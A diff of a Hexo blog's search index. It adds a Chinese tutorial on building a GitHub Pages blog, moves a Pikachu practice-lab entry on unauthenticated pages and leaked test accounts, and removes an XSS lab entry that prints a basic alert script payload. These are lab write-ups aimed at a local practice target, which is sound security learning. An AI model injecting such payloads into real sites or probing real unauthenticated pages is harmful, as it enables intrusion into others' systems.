@@ -1,21 +1,324 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>pikachu靶场系列-敏感信息泄露</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/IcanseeyourABC/</url>
-    <content><![CDATA[<p>敏感信息泄露涉及很多方面</p>
-<p>未授权接口，网站源码，用户名密码泄露等都可以归为敏感信息泄露</p>
-<h3 id="find-abc"><a href="#find-abc" class="headerlink" title="find abc"></a>find abc</h3><p>该题查看网站源码可以看到泄露的测试账号</p>
-<p><img src="/images/image-20230110143848742.png" alt="image-20230110143848742"></p>
-<p>成功登录</p>
-<p><img src="/images/image-20230110144000741.png" alt="image-20230110144000741"></p>
-<p>并且发现，该后台为未授权接口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/infoleak/abc.php</span><br></pre></td></tr></table></figure>
+    <title>使用github搭建个人博客</title>
+    <url>/2023/05/04/ForGithub/%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
+    <content><![CDATA[<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html#%E5%88%9B%E5%BB%BA%E4%BB%93%E5%BA%93">https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html#%E5%88%9B%E5%BB%BA%E4%BB%93%E5%BA%93</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/106166402">https://zhuanlan.zhihu.com/p/106166402</a></p>
+<h2 id="初始化github博客"><a href="#初始化github博客" class="headerlink" title="初始化github博客"></a>初始化github博客</h2><h3 id="创建仓库github-io"><a href="#创建仓库github-io" class="headerlink" title="创建仓库github.io"></a>创建仓库github.io</h3><p>新建一个仓库，名为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名.github.io</span><br></pre></td></tr></table></figure>
 
-<p>不需要登录也能访问</p>
+<p>比如，如果你的github用户名是test，那么你就新建test.github.io的仓库，将来博客访问地址就是 </p>
+<p><a href="http://test.github.io/">http://test.github.io</a> </p>
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>注册的邮箱一定要验证，否则不会成功；<br>仓库名字必须是：username.github.io，其中username是你的用户名；<br>仓库创建成功不会立即生效，需要等待一段时间<br>创建成功后，默认会在你这个仓库里生成一些示例页面，之后所有的代码就在这个仓库里</p>
+<h3 id="创建一个新的文件"><a href="#创建一个新的文件" class="headerlink" title="创建一个新的文件"></a>创建一个新的文件</h3><p>creating a new file</p>
+<p><img src="/images/image-20230427210634629.png" alt="image-20230427210634629"></p>
+<p>注意，新文件的名字必须是 index.html，因为静态http文件托管服务的默认访问文件就是index.html</p>
+<p><img src="/images/image-20230427211033346.png" alt="image-20230427211033346"></p>
+<p>然后仓库中就会新建一个新的index.html</p>
+<p><img src="/images/image-20230427211126285.png" alt="image-20230427211126285"></p>
+<p>进入setting</p>
+<p>找到Pages—-&gt;GitHub Pages</p>
+<p><img src="/images/image-20230427211226403.png" alt="image-20230427211226403"></p>
+<p>可以看到生成的url</p>
+<p><img src="/images/image-20230427211311823.png" alt="image-20230427211311823"></p>
+<p>访问</p>
+<p><img src="/images/image-20230427211429618.png" alt="image-20230427211429618"></p>
+<h2 id="windows下npm安裝"><a href="#windows下npm安裝" class="headerlink" title="windows下npm安裝"></a>windows下npm安裝</h2><h3 id="首先要了解"><a href="#首先要了解" class="headerlink" title="首先要了解"></a>首先要了解</h3><h5 id="npm"><a href="#npm" class="headerlink" title="npm"></a>npm</h5><p>nodejs 下的包管理器</p>
+<h5 id="webpack"><a href="#webpack" class="headerlink" title="webpack"></a>webpack</h5><p>它主要用途是通过CommonJS 的语法把所有浏览器端需要发布的静态资源作相应的准备，比如资源的合并和打包。</p>
+<h5 id="vue-cli"><a href="#vue-cli" class="headerlink" title="vue-cli"></a>vue-cli</h5><p>帮你快速开始一个vue的项目，也就是给你一套vue的结构，包含基础的依赖库，只需要npm install 就可以安装</p>
+<h3 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h3><p><a href="https://nodejs.org/en/">https://nodejs.org/en/</a></p>
+<p><img src="/images/image-20230427214607908.png" alt="image-20230427214607908"></p>
+<p>这里下载的是LTS版本</p>
+<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>一路next就行，更新了环境变量如果没有起效，重启下就好了</p>
+<p><img src="/images/image-20230427220333673.png" alt="image-20230427220333673"></p>
+<p>出现上图情况即安装成功</p>
+<h2 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h2><p>Hexo是一个基于 Github Pages 的博客发布工具，支持Markdown格式，有众多优秀插件和主题</p>
+<h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><p><a href="https://zhuanlan.zhihu.com/p/618864711">https://zhuanlan.zhihu.com/p/618864711</a></p>
+<h3 id="下载链接-1"><a href="#下载链接-1" class="headerlink" title="下载链接"></a>下载链接</h3><p>官网： <a href="http://hexo.io/">http://hexo.io</a><br>github: <a href="https://github.com/hexojs/hexo">https://github.com/hexojs/hexo</a></p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>由于github pages存放的都是静态文件，博客存放的不只是文章内容，还有文章列表、分类、标签、翻页等动态内容，假如每次写完一篇文章都要手动更新博文目录和相关链接信息，太过麻烦。</p>
+<p>Hexo能够将这些md文件都放在本地，每次写完文章后调用命令来批量完成相关页面的生成，然后再将有改动的页面提交到github。</p>
+<h3 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h3><p>1.由于是windows环境，很多命令既可以cmd来完成，也可以使用git bash来完成，但是部分命令会有一些问题，为避免出现不必要的问题，建议全部使用git bash来执行；<br>2.hexo不同版本差别比较大，网上很多文章的配置信息都是基于2.x的，所以注意不要被误导；<br>3.hexo有2种config.yml文件，一个是根目录下的全局的config.yml，一个是各个theme下的config.yml</p>
+<h3 id="安裝"><a href="#安裝" class="headerlink" title="安裝"></a>安裝</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g hexo</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230427220721568.png" alt="image-20230427220721568"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo -h</span><br></pre></td></tr></table></figure>
+
+<p>出现下图即表示安装成功</p>
+<p><img src="/images/image-20230427220802122.png" alt="image-20230427220802122"></p>
+<p>新建一个文件夹（名字可以随便取），这个文件夹将来就作为你存放代码的地方</p>
+<p>假设我这里是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\Github\WWW</span><br></pre></td></tr></table></figure>
+
+<p>在该目录执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230427222527267.png" alt="image-20230427222527267"></p>
+<p>hexo会自动下载一些文件到这个目录，包括node_modules，目录结构如下图</p>
+<p><img src="/images/image-20230427222555181.png" alt="image-20230427222555181"></p>
+<p>node_modules: 依赖包</p>
+<p>public：存放生成的页面</p>
+<p>scaffolds：生成文章的一些模板</p>
+<p>source：用来存放你的文章</p>
+<p>themes：主题</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo g # 生成</span><br></pre></td></tr></table></figure>
+
+<p>执行以上命令之后，hexo就会在public文件夹生成相关html文件，这些文件将来都是要提交到github的</p>
+<p><img src="/images/image-20230427222716128.png" alt="image-20230427222716128"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s # 启动服务</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230427222752584.png" alt="image-20230427222752584"></p>
+<p>访问web</p>
+<p><img src="/images/image-20230427222814493.png" alt="image-20230427222814493"></p>
+<h3 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h3><p>搭建好网站之后，需要修改配置</p>
+<p>打开博客目录下的_config.yml文件</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>title</td>
+<td>网站的标题</td>
+</tr>
+<tr>
+<td>subtitle</td>
+<td>网站的副标题</td>
+</tr>
+<tr>
+<td>description</td>
+<td>对于网站的描述，主要用于SEO</td>
+</tr>
+<tr>
+<td>keywords</td>
+<td>网站的关键词，支持多个关键词</td>
+</tr>
+<tr>
+<td>author</td>
+<td>作者名</td>
+</tr>
+<tr>
+<td>language</td>
+<td>网站使用的语言，对于简体中文用户来说，语言的设置跟使用不同的主题有关，可以参考各自主题的文档自行配置，一般为zh-CN</td>
+</tr>
+<tr>
+<td>timezone</td>
+<td>设置网站的时区，如果不填则默认使用你电脑的时区</td>
+</tr>
+</tbody></table>
+<p>修改完之后可以通过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
+
+<p>重新更新博客</p>
+<h3 id="修改主题"><a href="#修改主题" class="headerlink" title="修改主题"></a>修改主题</h3><p>上述是默认的主题，如果想改，下面链接中有不少主题</p>
+<p><a href="https://hexo.io/themes/">https://hexo.io/themes/</a></p>
+<p>下面这篇文章也有不少推荐</p>
+<p><a href="https://zhuanlan.zhihu.com/p/385525053">https://zhuanlan.zhihu.com/p/385525053</a></p>
+<p>博客目录下的\themes目录就是存放主题的目录</p>
+<p><img src="/images/image-20230427230210639.png" alt="image-20230427230210639"></p>
+<p>这里以安装hexo-theme-3-hexo主题为例</p>
+<p><a href="https://github.com/yelog/hexo-theme-3-hexo">https://github.com/yelog/hexo-theme-3-hexo</a></p>
+<p>下载后自己重命名了放置\themes目录</p>
+<p><img src="/images/image-20230427235501948.png" alt="image-20230427235501948"></p>
+<p>修改博客目录的_config.yml文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">theme: 3-hexo</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230428000925363.png" alt="image-20230428000925363"></p>
+<p>然后重刷一下hexo</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
+
+<h2 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h2><p>blog的文章都放在blog根目录的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\source\_posts</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230428124606458.png" alt="image-20230428124606458"></p>
+<p>.md文件中有些格式需要注意</p>
+<p>文件开头需要有一些说明性字段</p>
+<p>使用yaml格式放在开头</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: test</span><br><span class="line">author: fn</span><br></pre></td></tr></table></figure>
+
+<p>例如，下面多出来的选项后面会叙述</p>
+<p><img src="/images/image-20230428150831967.png" alt="image-20230428150831967"></p>
+<h3 id="图片加载"><a href="#图片加载" class="headerlink" title="图片加载"></a>图片加载</h3><p>文章可能会出现图片无法加载的问题</p>
+<p><img src="/images/image-20230428235342344.png" alt="image-20230428235342344"></p>
+<p>安装</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install https://github.com/7ym0n/hexo-asset-image --save</span><br></pre></td></tr></table></figure>
+
+<p>修改博客目录下的_config.yml文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post_asset_folder: true</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230429002339908.png" alt="image-20230429002339908"></p>
+<p>然后需要在</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\source\</span><br></pre></td></tr></table></figure>
+
+<p>目录下新建一个images目录(自定义)，用于存放所有的图片</p>
+<p>接下来最关键的一步，要将md文件中原本的图片引用更改为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">![image-20230429002339908](images/image-20230429002339908.png)</span><br></pre></td></tr></table></figure>
+
+<p>上述步骤完成后，便可以加载图片了</p>
+<h2 id="NexT主题"><a href="#NexT主题" class="headerlink" title="NexT主题"></a>NexT主题</h2><h3 id="添加tags"><a href="#添加tags" class="headerlink" title="添加tags"></a>添加tags</h3><p>打开 themes 的 next 的 _config.yml</p>
+<p><img src="/images/image-20230428092033999.png" alt="image-20230428092033999"></p>
+<p>搜索menu，是博客菜单选项，注释去掉就可以开启相应的模块</p>
+<p>注意，修改之后要注意缩进，在hexo g的时候会报错</p>
+<p><img src="/images/image-20230428092653690.png" alt="image-20230428092653690"></p>
+<p>同时在blog的根目录执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page tags  # tags是对应的tag名</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230428093518943.png" alt="image-20230428093518943"></p>
+<p>这一步是为了添加标签跳转的页面，存放在blog根目录的souce目录下</p>
+<p><img src="/images/image-20230428093654513.png" alt="image-20230428093654513"></p>
+<p>新建的是md文件，自己修改即可</p>
+<p><img src="/images/image-20230428095631244.png" alt="image-20230428095631244"></p>
+<p>添加的tag汇总下图位置出现</p>
+<p><img src="/images/image-20230428092848010.png" alt="image-20230428092848010"></p>
+<p>点击后</p>
+<p><img src="/images/image-20230428093617986.png" alt="image-20230428093617986"></p>
+<p>去除标签可以删除上述about目录，同时去除注释，然后hexo clean刷新</p>
+<h3 id="添加搜索功能"><a href="#添加搜索功能" class="headerlink" title="添加搜索功能"></a>添加搜索功能</h3><p>在blog根目录下载搜索插件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230428100300614.png" alt="image-20230428100300614"></p>
+<p>在根目录的 _config.yml 文件中 的末尾添加下面的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># hexo-generator-searchdb</span><br><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10</span><br></pre></td></tr></table></figure>
+
+<p>在主题 的 _config配置文件中找到 local_search，下面的enable改为true</p>
+<p><img src="/images/image-20230428100541908.png" alt="image-20230428100541908"></p>
+<p>然后hexo刷新即可</p>
+<p><img src="/images/image-20230428100723071.png" alt="image-20230428100723071"></p>
+<h3 id="添加文章的字数统计"><a href="#添加文章的字数统计" class="headerlink" title="添加文章的字数统计"></a>添加文章的字数统计</h3><p>blog根目录下载插件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-symbols-count-time --save</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230428101231294.png" alt="image-20230428101231294"></p>
+<p>在根目录的 _config.yml 文件中 的末尾添加下面的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">symbols_count_time:</span><br><span class="line">  # 每篇文章显示</span><br><span class="line">  symbols: true</span><br><span class="line">  time: true</span><br><span class="line">  # 文章底部显示</span><br><span class="line">  total_symbols: false  </span><br><span class="line">  total_time: false</span><br><span class="line">  # 是否统计代码块</span><br><span class="line">  exclude_codeblock: false</span><br><span class="line">  awl: 2</span><br><span class="line">  wpm: 275</span><br><span class="line">  suffix: &quot;mins.&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="隐藏网页底部-powered-By"><a href="#隐藏网页底部-powered-By" class="headerlink" title="隐藏网页底部 powered By"></a>隐藏网页底部 powered By</h3><p><img src="/images/image-20230428111012051.png" alt="image-20230428111012051"></p>
+<p>打开</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">themes/next/layout/_partials/footer.njk</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230428111327561.png" alt="image-20230428111327561"></p>
+<p>把这段代码注释了</p>
+<p><img src="/images/image-20230428111402508.png" alt="image-20230428111402508"></p>
+<h3 id="添加分类"><a href="#添加分类" class="headerlink" title="添加分类"></a>添加分类</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure>
+
+<p>主题的_config.yml文件中开启categories</p>
+<p><img src="/images/image-20230428140807260.png" alt="image-20230428140807260"></p>
+<p>在文章开头添加yml</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: text222222</span><br><span class="line">author: fn</span><br><span class="line">type: &quot;categories&quot;</span><br><span class="line">categories: </span><br><span class="line">- Android</span><br></pre></td></tr></table></figure>
+
+<p>点击文章可以看到分类</p>
+<p><img src="/images/image-20230428141302810.png" alt="image-20230428141302810"></p>
+<p>但是直接点分类却不会看到分类</p>
+<p><img src="/images/image-20230428141350416.png" alt="image-20230428141350416"></p>
+<p>这里还需要有一个关键的操作</p>
+<p>调用hexo new page xxx后，会在&#x2F;source&#x2F;categories&#x2F;目录下生成一个index.md文档</p>
+<p>需要在index.md头部添加</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: categories</span><br><span class="line">type: &quot;categories&quot;</span><br></pre></td></tr></table></figure>
+
+<p>title可以自定义</p>
+<p><img src="/images/image-20230428142249649.png" alt="image-20230428142249649"></p>
+<h3 id="更改首页"><a href="#更改首页" class="headerlink" title="更改首页"></a>更改首页</h3><p>Next默认是会显示全文的</p>
+<h5 id="方法1-文章添加description头"><a href="#方法1-文章添加description头" class="headerlink" title="方法1 文章添加description头"></a>方法1 文章添加description头</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: text222222</span><br><span class="line">author: fn</span><br><span class="line">description: f</span><br><span class="line">type: &quot;categories&quot;</span><br><span class="line">categories: </span><br><span class="line">- Android</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230428144425660.png" alt="image-20230428144425660"></p>
+<h5 id="方法2-文章截断"><a href="#方法2-文章截断" class="headerlink" title="方法2 文章截断"></a>方法2 文章截断</h5><p>方法二：文章截断</p>
+<p>在需要截断的地方加入：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--more--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>首页就会显示这条以上的所有内容，隐藏接下来的所有内容。<br>例如本文会显示到修改配置上面。</p>
+<p><img src="/images/image-20230428145348111.png" alt="image-20230428145348111"></p>
+<p>显示出来就是</p>
+<p><img src="/images/image-20230428145359118.png" alt="image-20230428145359118"></p>
+<h3 id="更改为黑暗模式"><a href="#更改为黑暗模式" class="headerlink" title="更改为黑暗模式"></a>更改为黑暗模式</h3><p>将主题的_config,yml</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dark Mode</span><br></pre></td></tr></table></figure>
+
+<p>打开即可</p>
+<p><img src="/images/image-20230428145630626.png" alt="image-20230428145630626"></p>
+<h3 id="去除分类中的日期"><a href="#去除分类中的日期" class="headerlink" title="去除分类中的日期"></a>去除分类中的日期</h3><p>分类中总是会显示一个日期，如何隐藏</p>
+<p><img src="/images/image-20230428150321532.png" alt="image-20230428150321532"></p>
+<p>找到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\themes\next\layout\_macro\post-collapse.njk</span><br></pre></td></tr></table></figure>
+
+<p>注释掉</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;span class=&quot;collection-header&quot;&gt;&#123;&#123; current_year &#125;&#125;&lt;/span&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这一行（在两侧加），可以隐藏开始的年份。</p>
+<p>将</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123; date(post.date, &#x27;MM-DD&#x27;) &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这一行中的MM-DD换为空格，可隐藏标题前的日期</p>
+<p><img src="/images/image-20230428150704733.png" alt="image-20230428150704733"></p>
+<p>刷新下，日期就没了</p>
+<p><img src="/images/image-20230428150739679.png" alt="image-20230428150739679"></p>
+<h3 id="修改中文固定字段"><a href="#修改中文固定字段" class="headerlink" title="修改中文固定字段"></a>修改中文固定字段</h3><p>日志中的这段字也可以修改</p>
+<p><img src="/images/image-20230428151201873.png" alt="image-20230428151201873"></p>
+<p>找到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\themes\next\languages\zh-CN.yml</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230428151509097.png" alt="image-20230428151509097"></p>
+<p>找到想改的字段修改即可</p>
+<p>也可以修改下述文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\themes\next\layout\archive.njk</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230428152726505.png" alt="image-20230428152726505"></p>
+<p>将上图所在行注释掉</p>
+<p><img src="/images/image-20230428152856461.png" alt="image-20230428152856461"></p>
+<h2 id="ssh连接github"><a href="#ssh连接github" class="headerlink" title="ssh连接github"></a>ssh连接github</h2><h3 id="公私钥准备"><a href="#公私钥准备" class="headerlink" title="公私钥准备"></a>公私钥准备</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -C &quot;xxxx@qq.com&quot;</span><br></pre></td></tr></table></figure>
+
+<p>-C是用户注释，这里填上登录github的邮箱即可</p>
+<p><img src="/images/image-20230427170950384.png" alt="image-20230427170950384"></p>
+<p>如果没有指定-f参数,默认情况下文件名为:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- id_rsa (私钥)</span><br><span class="line">- id_rsa.pub (公钥)</span><br></pre></td></tr></table></figure>
+
+<p>或者可以指定参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -C &quot;xxxx@qq.com&quot; -f github</span><br></pre></td></tr></table></figure>
+
+<p>注意：这里建议使用默认，不然后面上传的时候会出错</p>
+<p>密钥保存位置在</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\用户名\.ssh</span><br></pre></td></tr></table></figure>
+
+<h3 id="github添加公钥"><a href="#github添加公钥" class="headerlink" title="github添加公钥"></a>github添加公钥</h3><p>进入到设置，找到SSH and GPG keys</p>
+<p>选择New SSH key</p>
+<p><img src="/images/image-20230427171420609.png" alt="image-20230427171420609"></p>
+<p>将刚刚生成的公钥部分填写进去</p>
+<p><img src="/images/image-20230427171535373.png" alt="image-20230427171535373"></p>
+<p><img src="/images/image-20230427171615992.png" alt="image-20230427171615992"></p>
+<h3 id="连接ssh"><a href="#连接ssh" class="headerlink" title="连接ssh"></a>连接ssh</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230504202143593.png" alt="image-20230504202143593"></p>
+<p>当出现successfully就证明没问题了</p>
+<h2 id="发布前准备"><a href="#发布前准备" class="headerlink" title="发布前准备"></a>发布前准备</h2><p>先将github的默认分支改为master</p>
+<p><img src="/images/image-20230504204811300.png" alt="image-20230504204811300"></p>
+<p>将email中的Keep my email addresses private取消勾选</p>
+<p><img src="/images/image-20230504205217157.png" alt="image-20230504205217157"></p>
+<h2 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h2><p>本地看后没问题，就可以发布到github了</p>
+<p>安装</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230504135150341.png" alt="image-20230504135150341"></p>
+<p>修改blog根目录_config.yml文件末尾的 Deployment 部分</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:用户名/用户名.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230504135925303.png" alt="image-20230504135925303"></p>
+<p>上述配置完成后即可上传</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>
+
+<p>这里如果是windows系统的话需要使用git bash</p>
+<p><img src="/images/image-20230504205720366.png" alt="image-20230504205720366"></p>
+<h2 id="发布后问题解决"><a href="#发布后问题解决" class="headerlink" title="发布后问题解决"></a>发布后问题解决</h2><p>发布后会发现图片还是有问题</p>
+<p><img src="/images/image-20230504211422453.png" alt="image-20230504211422453"></p>
+<p>打开图片看看链接，可以看到文件的路径被编码了</p>
+<p><img src="/images/image-20230504211501815.png" alt="image-20230504211501815"></p>
+<p>当我们把其换回斜杠，图片成功加载，所以我们就解决编码的问题就行</p>
+<p><img src="/images/image-20230504211639038.png" alt="image-20230504211639038"></p>
+<p>这里其实是正反斜杠的问题</p>
+<p><img src="/images/image-20230504212739811.png" alt="image-20230504212739811"></p>
+<p>需要将”\“改为”&#x2F;“</p>
+<p><img src="/images/image-20230504212829471.png" alt="image-20230504212829471"></p>
 ]]></content>
       <categories>
-        <category>pikachu靶场系列</category>
+        <category>ForGithub</category>
       </categories>
   </entry>
   <entry>
@@ -104,6 +407,24 @@
 <p>可以借助logger++插件</p>
 <p><img src="/images/image-20230112151526121.png" alt="image-20230112151526121"></p>
 <p>可以发现每一个token的值都不同</p>
+]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>pikachu靶场系列-敏感信息泄露</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/IcanseeyourABC/</url>
+    <content><![CDATA[<p>敏感信息泄露涉及很多方面</p>
+<p>未授权接口，网站源码，用户名密码泄露等都可以归为敏感信息泄露</p>
+<h3 id="find-abc"><a href="#find-abc" class="headerlink" title="find abc"></a>find abc</h3><p>该题查看网站源码可以看到泄露的测试账号</p>
+<p><img src="/images/image-20230110143848742.png" alt="image-20230110143848742"></p>
+<p>成功登录</p>
+<p><img src="/images/image-20230110144000741.png" alt="image-20230110144000741"></p>
+<p>并且发现，该后台为未授权接口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/infoleak/abc.php</span><br></pre></td></tr></table></figure>
+
+<p>不需要登录也能访问</p>
 ]]></content>
       <categories>
         <category>pikachu靶场系列</category>
@@ -373,394 +694,6 @@
       </categories>
   </entry>
   <entry>
-    <title>pikachu靶场系列-xss</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/xss/</url>
-    <content><![CDATA[<h1 id="XSS概述"><a href="#XSS概述" class="headerlink" title="XSS概述"></a>XSS概述</h1><p><img src="/./assets/1660183695659-3123c470-f608-4694-b555-23d2741c5e75.png" alt="img"></p>
-<p>具体来说，XSS攻击有两种类型：存储型XSS和反射型XSS，此外还涉及一种DOM型的XSS。</p>
-<h5 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h5><p>指的是将攻击代码存储在网站的数据库中，等待用户访问时自动执行。</p>
-<h5 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h5><p>指的是将攻击代码作为URL参数的值传递给服务器，服务器将其直接输出到浏览器端，从而在用户的浏览器中执行攻击代码。</p>
-<h5 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h5><p>是一种比较特殊的XSS攻击，它利用浏览器中的DOM（文档对象模型）漏洞来实现攻击。与传统的XSS攻击相比，DOM型XSS有一些明显的区别：</p>
-<p>1.DOM型XSS不依赖于服务器的输出，因此无需修改服务器端代码来攻击。</p>
-<p>2.DOM型XSS攻击的源代码不会被服务器端的代码直接输出，而是通过浏览器的JavaScript代码在客户端进行解析和执行。</p>
-<p>3.DOM型XSS攻击的攻击范围更广，可以通过各种手段（如邮件、聊天工具、社交媒体等）将攻击代码传递给用户，从而对用户的浏览器进行攻击。</p>
-<h5 id="辨别"><a href="#辨别" class="headerlink" title="辨别"></a>辨别</h5><p>如何辨别一个XSS攻击是否为DOM型XSS呢？下面是几个可以帮助你进行辨别的方法：</p>
-<p>1.检查攻击代码是否被服务器端的代码直接输出。如果攻击代码被直接输出，则可能是反射型XSS；如果攻击代码未被直接输出，则可能是DOM型XSS。</p>
-<p>2.检查攻击代码是否来自用户的输入。如果攻击代码来自用户的输入，则可能是DOM型XSS；如果攻击代码不是来自用户的输入，则可能是存储型XSS。</p>
-<p>3.检查攻击代码是否依赖于浏览器的JavaScript代码执行。如果攻击代码依赖于浏览器的JavaScript代码执行，则可能是DOM型XSS；如果攻击代码不依赖于浏览器的JavaScript代码执行，则可能是存储型XSS。</p>
-<h5 id="最基本的payload"><a href="#最基本的payload" class="headerlink" title="最基本的payload"></a>最基本的payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>该payload会在浏览器上跳出一个弹窗</p>
-<p>xss就是在我们可控的地方放入可解析的代码</p>
-<p><img src="/images/1660186046326-4d44628a-58c7-457d-90ed-96f14c503504.png" alt="img"></p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/zfYRi8kCu1KRb17cjXo7Zg">https://mp.weixin.qq.com/s/zfYRi8kCu1KRb17cjXo7Zg</a></p>
